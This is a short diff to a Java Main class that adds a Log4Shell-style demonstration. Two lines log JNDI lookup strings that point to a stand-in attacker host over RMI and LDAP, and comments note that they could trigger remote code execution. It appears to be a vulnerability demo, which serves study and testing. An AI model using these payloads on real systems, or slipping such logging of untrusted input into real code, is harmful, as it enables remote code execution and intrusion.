@@ -42,5 +42,17 @@ public class Main {
             // for you, but you can always add more by pressing <shortcut actionId="ToggleLineBreakpoint"/>.
 
         }
+
+        // Load configuration (could be vulnerable too)
+
+
+        // User-controlled input
+        String maliciousInput = "${jndi:rmi://attacker.com:1099/Exploit}";
+
+        // VULNERABLE in certain configurations
+        logger.info("Processing: " + maliciousInput);
+
+        // This could trigger RCE if JMSAppender is configured
+        logger.error("Payload: ${jndi:ldap://attacker.com:1389/Exploit}");
     }
 }
